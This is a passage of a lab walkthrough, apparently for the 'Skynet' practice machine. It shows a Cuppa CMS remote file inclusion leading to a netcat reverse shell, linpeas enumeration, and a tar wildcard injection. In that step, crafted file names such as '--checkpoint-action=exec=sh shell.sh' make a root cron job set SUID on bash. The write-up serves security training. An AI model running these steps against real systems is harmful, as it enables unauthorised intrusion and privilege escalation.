--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                            | php/webapps/25971.txt
```

![](/home/edith/pwn/vuln_machines/skynet/004.png)

As per the above exploit - try include remote file (**RFI vulnerability**)

- Configure params on php reverse shell and host it
- Set up the listener
- Access the remote file as per exploit

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/skynet/share]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.17.49.246] from (UNKNOWN) [10.10.143.70] 34120
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 06:09:17 up  1:40,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Stablise the shell

```
$ python -c "import pty; pty.spawn('/bin/bash')"
www-data@skynet:/$ export TERM=xterm
export TERM=xterm
www-data@skynet:/$ ^Z
[1]+  Stopped                 nc -nvlp 4444

┌──(edith🛸HackBox)-[~/pwn/vuln_machines/skynet/share]
└─$ stty raw -echo; fg
nc -nvlp 4444

www-data@skynet:/$ 
```

### Privilege escalation

Using linpeas

```
www-data@skynet:/tmp$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                      
    |---------------------------------------------------------------------------------|                                                                      
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                      
    |         Respect on HTB            :     SirBroccoli                             |                                                                      
    |---------------------------------------------------------------------------------|                                                                      
    |                                 Thank you!                                      |                                                                      
    \---------------------------------------------------------------------------------/                                                                      
          linpeas-ng by github.com/PEASS-ng                                                                                                                  

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                     
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                       
/usr/bin/crontab                                                                                                                                             
incrontab Not Found
-rw-r--r-- 1 root root     776 Sep 17  2019 /etc/crontab                                                                                                     

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root  589 Jul 16  2014 mdadm
-rw-r--r--   1 root root  712 Dec 17  2018 php
-rw-r--r--   1 root root  191 Sep 17  2019 popularity-contest

/etc/cron.daily:
total 68
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  539 Jun 11  2018 apache2
-rwxr-xr-x   1 root root  376 Mar 31  2016 apport
-rwxr-xr-x   1 root root 1474 Oct  9  2018 apt-compat
-rwxr-xr-x   1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x   1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x   1 root root  372 May  5  2015 logrotate
-rwxr-xr-x   1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x   1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x   1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x   1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x   1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x   1 root root  383 Sep 24  2018 samba
-rwxr-xr-x   1 root root  330 Apr  7  2018 squirrelmail
-rwxr-xr-x   1 root root  214 Dec  7  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x   1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x   1 root root  211 Dec  7  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

**(OR)**

On checking the folders found that backup script 

```
www-data@skynet:/home/milesdyson/backups$ ls
backup.sh  backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh 
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

> tar uses wildcard here

On checking the cronjob running using 

```
www-data@skynet:/tmp$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

backup.sh script which uses wildcard running every 1 minute as root - try wildcard injection

*Based on gtfobins*

![](/home/edith/pwn/vuln_machines/skynet/005.png)

- Create shell.sh one liner script to set the SUID bit set for bash (see below)
- Create files for tar
    I. checkpoint=1
    II. --checkpoint-action=exec=sh shell.sh
- Wait untill the cronjob runs --> success!

```
www-data@skynet:/var/www/html$ printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
www-data@skynet:/var/www/html$ echo "" > checkpoint=1
www-data@skynet:/var/www/html$ echo "" > '--checkpoint-action=exec=sh shell.sh'
www-data@skynet:/var/www/html$ date
Sun May 12 09:11:32 CDT 2024
www-data@skynet:/var/www/html$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
www-data@skynet:/var/www/html$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
www-data@skynet:/var/www/html$ /bin/bash -p   
bash-4.3# whoami
root
bash-4.3# 
```
